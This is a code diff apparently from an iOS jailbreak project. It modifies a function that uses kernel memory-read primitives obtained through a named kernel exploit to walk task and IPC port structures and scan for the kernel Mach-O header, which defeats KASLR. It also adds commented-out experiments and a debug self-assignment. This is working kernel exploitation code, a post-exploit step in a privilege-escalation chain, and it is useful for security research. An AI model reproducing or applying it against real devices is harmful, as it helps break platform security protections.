@@ -34,6 +34,33 @@ uint64_t task_addr_cache;
 uint64_t find_kbase()
 {
     uint64_t task_addr;
+    
+    if (task_self_addr_cache != 0) {
+        uint64_t task_port_addr = task_self_addr_cache;
+        task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+    } else {
+        task_addr = task_addr_cache;
+    }
+    
+//    kern_return_t kr = 0;
+//    uint64_t *kernel_task_base = NULL;
+//    uint64_t *kernel_task_slide = NULL;
+//    struct task_dyld_info *task_dyld_info = NULL;
+//    mach_msg_type_number_t *task_dyld_info_count = NULL;
+//    kernel_task_base = malloc(sizeof(uint64_t));
+//    bzero(kernel_task_base, sizeof(uint64_t));
+//    kernel_task_slide = malloc(sizeof(uint64_t));
+//    bzero(kernel_task_slide, sizeof(uint64_t));
+//    task_dyld_info = malloc(sizeof(struct task_dyld_info));
+//    bzero(task_dyld_info, sizeof(struct task_dyld_info));
+//    task_dyld_info_count = malloc(sizeof(mach_msg_type_number_t));
+//    bzero(task_dyld_info_count, sizeof(mach_msg_type_number_t));
+//    *task_dyld_info_count = TASK_DYLD_INFO_COUNT;
+//    kr = task_info(tfp0, TASK_DYLD_INFO, (task_info_t)task_dyld_info, task_dyld_info_count);
+//    *kernel_task_slide = task_dyld_info->all_image_info_size;
+//    *kernel_task_base = *kernel_task_slide + 0xfffffff007004000;
+//    return kernel_base;
+    
     switch (selectedExploit) {
         case RootlessExploitSockPort3: {
             uint64_t task_port_addr = task_self_addr_cache;
@@ -47,15 +74,23 @@ uint64_t find_kbase()
 
     uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
     uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
-    
+
     uint32_t port_index = mach_host_self() >> 8;
     const int sizeof_ipc_entry_t = 0x18;
-    
+
     uint64_t port_addr = rk64(is_table + (port_index * sizeof_ipc_entry_t));
-    
+
     uint64_t realhost = rk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
-    
+
     uint64_t base = realhost & ~0xfffULL;
+
+//    uint64_t debugRet = 0;
+//
+//    debugRet = 0; //debugger write
+//
+//    if (debugRet != 0)
+//        return debugRet;
+
     // walk down to find the magic:
     for (int i = 0; i < 0x10000; i++) {
         if (rk32(base) == 0xfeedfacf) {
@@ -79,6 +114,8 @@ bool runExploitSockPort3() {
         }
     }
 
+    
+    task_self_addr_cache =task_self_addr_cache; // debug
     kernel_base = find_kbase();
     kernel_slide = (kernel_base - 0xFFFFFFF007004000);
 
